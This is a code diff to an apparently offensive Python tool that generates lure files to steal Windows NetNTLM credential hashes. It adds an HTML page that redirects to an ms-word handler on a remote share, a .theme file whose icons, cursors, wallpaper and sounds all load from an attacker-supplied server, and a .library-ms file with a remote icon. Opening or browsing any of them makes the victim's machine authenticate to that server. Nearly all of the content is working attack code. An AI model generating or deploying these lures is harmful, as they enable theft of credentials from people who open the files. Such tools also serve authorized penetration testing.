@@ -22,6 +22,7 @@ from __future__ import print_function
 # https://github.com/rocketscientist911/excel-ntlmv2
 # https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/#comments
 # https://www.youtube.com/watch?v=PDpBEY1roRc
+# https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt
 
 import argparse
 import io
@@ -64,6 +65,7 @@ parser.add_argument('-g', '--generate',
 		"application",
 		"pdf",
 		"zoom",
+		"libraryms",
 		"autoruninf",
 		"desktopini")),
     help='Choose to generate all files or a specific filetype')
@@ -152,6 +154,19 @@ def create_htm(generate,server,filename):
 	file.write('''<!DOCTYPE html>
 <html>
    <img src="file://''' + server + '''/leak/leak.png"/>
+</html>''')
+	file.close()
+	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
+
+# .htm with rlocal handler attack
+# Filename: shareattack-(handler).htm, action=open, attacks=open in web browser, will automatically open word
+def create_htm_handler(generate,server,filename):
+	file = open(filename,'w')
+	file.write('''<!DOCTYPE html>
+<html>
+	<script>
+		location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+	</script>
 </html>''')
 	file.close()
 	print("Created: " + filename + " (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")
@@ -390,6 +405,76 @@ def create_zoom(generate,server,filename):
 	file.close()
 	print("Created: " + filename + " (PASTE TO CHAT)")
 
+def create_theme(generate,server,filename):
+	with open(filename, 'w') as file:
+		file.write('''[Theme]
+; Windows - IDS_THEME_DISPLAYNAME_AERO_LIGHT
+DisplayName=\\'''+ server +''' Theme
+SetLogonBackground=0
+; Computer - SHIDI_SERVER
+[CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon]
+DefaultValue=\\\\'''+server+'''\\setup.exe,-109
+
+; UsersFiles - SHIDI_USERFILES
+[CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\DefaultIcon]
+DefaultValue=\\\\'''+server+'''\\setup.exe,-123
+
+; Network - SHIDI_MYNETWORK
+[CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\DefaultIcon]
+DefaultValue=\\\\'''+server+'''\\setup.exe,-25
+
+; Recycle Bin - SHIDI_RECYCLERFULL SHIDI_RECYCLER
+[CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon]
+Full=\\\\'''+server+'''\\setup.exe,-54
+Empty=\\\\'''+server+'''\\setup.exe,-55
+
+[Control Panel\\Cursors]
+AppStarting=\\\\'''+server+'''\\setup.exe
+Arrow=\\\\'''+server+'''\\aero_arrow.cur
+Crosshair=
+Hand=\\\\'''+server+'''\\aero_link.cur
+Help=\\\\'''+server+'''\\aero_helpsel.cur
+IBeam=
+No=\\\\'''+server+'''\\aero_unavail.cur
+NWPen=\\\\'''+server+'''\\aero_pen.cur
+SizeAll=\\\\'''+server+'''\\aero_move.cur
+SizeNESW=\\\\'''+server+'''\\aero_nesw.cur
+SizeNS=\\\\'''+server+'''\\aero_ns.cur
+SizeNWSE=\\\\'''+server+'''\\aero_nwse.cur
+SizeWE=\\\\'''+server+'''\\aero_ew.cur
+UpArrow=\\\\'''+server+'''\\aero_up.cur
+Wait=\\\\'''+server+'''\\aero_busy.ani
+DefaultValue=Windows Default
+DefaultValue.MUI=@main.cpl,-1020
+
+[Control Panel\\Desktop]
+Wallpaper=\\\\'''+server+'''\\setup.exe
+TileWallpaper=0
+WallpaperStyle=10
+Pattern=
+MultimonBackgrounds=0
+
+[VisualStyles]
+Path=\\\\'''+server+'''\\Themes\\Aero\\Aero.msstyles
+ColorStyle=NormalColor
+Size=NormalSize
+AutoColorization=0
+ColorizationColor=0XC40078D4
+SystemMode=Light
+AppMode=Light
+
+[boot]
+SCRNSAVE.EXE=
+
+[MasterThemeSelector]
+MTSM=RJSPBS
+
+[Sounds]
+; IDS_SCHEME_DEFAULT
+SchemeName=@\\\\'''+server+'''\\setup.dll,-800
+		''')
+	print("Created: " + filename + " (THEME TO INSTALL")
+
 def create_autoruninf(generate,server,filename):
 	if generate == "modern":
 		print("Skipping Autorun.inf as it does not work on modern Windows")
@@ -411,6 +496,41 @@ def create_desktopini(generate,server,filename):
 IconResource=\\\\''' + server + '''\\aa''')
 	file.close()
 	print("Created: " + filename + " (BROWSE TO FOLDER)")
+
+def create_libraryms(generate,server,filename):
+	file = open(filename,'w')
+	file.write('''<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+<name>@shell32.dll,-34575</name>
+<ownerSID>S-1-5-21-372074477-2495183225-776587326-1000</ownerSID>
+<version>1</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>\\\\''' + server + '''\\aa</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+</templateInfo>
+<searchConnectorDescriptionList>
+<searchConnectorDescription publisher="Microsoft" product="Windows">
+<description>@shell32.dll,-34577</description>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<simpleLocation>
+<url>knownfolder:{FDD39AD0-238F-46AF-ADB4-6C85480369C7}</url>
+<serialized>MBAAAEAFCAAA...MFNVAAAAAA</serialized>
+</simpleLocation>
+</searchConnectorDescription>
+<searchConnectorDescription publisher="Microsoft" product="Windows">
+<description>@shell32.dll,-34579</description>
+<isDefaultNonOwnerSaveLocation>true</isDefaultNonOwnerSaveLocation>
+<simpleLocation>
+<url>knownfolder:{ED4824AF-DCE4-45A8-81E2-FC7965083634}</url>
+<serialized>MBAAAEAFCAAA...HJIfK9AAAAAA</serialized>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>''')
+	file.close()
+	print("Created: " + filename + " (BROWSE TO FOLDER)")
+
 
 # .lnk remote IconFile Attack
 # Filename: shareattack.lnk, action=browse, attacks=explorer
@@ -454,6 +574,7 @@ if (args.generate == "all" or args.generate == "modern"):
 	create_xml_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(fulldocx).xml"))
 
 	create_htm(args.generate, args.server, os.path.join(args.filename, args.filename + ".htm"))
+	create_htm_handler(args.generate, args.server, os.path.join(args.filename, args.filename + "-(handler).htm"))
 
 	create_docx_includepicture(args.generate, args.server, os.path.join(args.filename, args.filename + "-(includepicture).docx"))
 	create_docx_remote_template(args.generate, args.server, os.path.join(args.filename, args.filename + "-(remotetemplate).docx"))
@@ -475,9 +596,13 @@ if (args.generate == "all" or args.generate == "modern"):
 
 	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
 
+	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
+
 	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
 
 	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
+
+	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
 
 elif(args.generate == "scf"):
 	create_scf(args.generate, args.server, os.path.join(args.filename, args.filename + ".scf"))
@@ -528,10 +653,16 @@ elif(args.generate == "pdf"):
 elif(args.generate == "zoom"):
 	create_zoom(args.generate, args.server, os.path.join(args.filename, "zoom-attack-instructions.txt"))
 
+elif(args.generate == "libraryms"):
+	create_libraryms(args.generate, args.server, os.path.join(args.filename, args.filename + ".library-ms"))
+
 elif(args.generate == "autoruninf"):
 	create_autoruninf(args.generate, args.server, os.path.join(args.filename, "Autorun.inf"))
 
 elif(args.generate == "desktopini"):
 	create_desktopini(args.generate, args.server, os.path.join(args.filename, "desktop.ini"))
+
+elif(args.generate == "theme"):
+	create_theme(args.generate, args.server, os.path.join(args.filename, args.filename + ".theme"))
 
 print("Generation Complete.")
